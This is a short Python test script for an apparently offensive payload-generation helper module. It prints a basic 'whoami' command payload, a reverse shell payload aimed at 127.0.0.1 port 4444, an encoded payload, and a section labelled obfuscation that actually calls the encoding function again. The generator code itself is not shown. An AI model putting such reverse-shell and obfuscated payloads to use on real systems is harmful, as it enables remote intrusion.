from utils.payload_helper import (
    generate_basic_payload,
    reverse_shell_payload,
    encode_payload,
    obfuscate_payload
)

# Bsic Command Test
print("[+] Bsic Payload:")
print(generate_basic_payload("whoami"))

# Reverse Shell Test
print("\n[+] Reverse Shell Payload:")
print(reverse_shell_payload("127.0.0.1", 4444))

# Encoded Payload Test
print("\n[+] Encoded Payload")
print(encode_payload("whoami"))

# Obfuscate Payload Test
print("\n[+] Obfuscated Payload:")
print(encode_payload("whoami"))
